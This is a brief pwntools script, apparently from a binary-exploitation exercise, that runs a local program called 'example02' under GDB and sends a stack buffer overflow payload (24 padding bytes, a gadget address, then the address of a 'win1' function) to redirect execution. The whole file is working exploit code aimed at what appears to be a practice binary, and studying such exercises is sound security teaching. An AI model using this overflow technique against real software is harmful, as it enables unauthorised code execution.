"""
from pwn import *  # NOQA

p = process('./example02')
binary = ELF('./example02')
rop = ROP('./example02')
"""

from pwn import *  # NOQA

context.terminal = ['tmux', 'splitw', '-h']

p = process('./example02')
gdb.attach(p, """
    # Optional GDB commands to run when connecting
""")

binary = ELF('./example02')
p.sendline(b'A' * 24 + p64(0x0000000000400506) + p64(binary.symbols['win1']))

p.interactive()
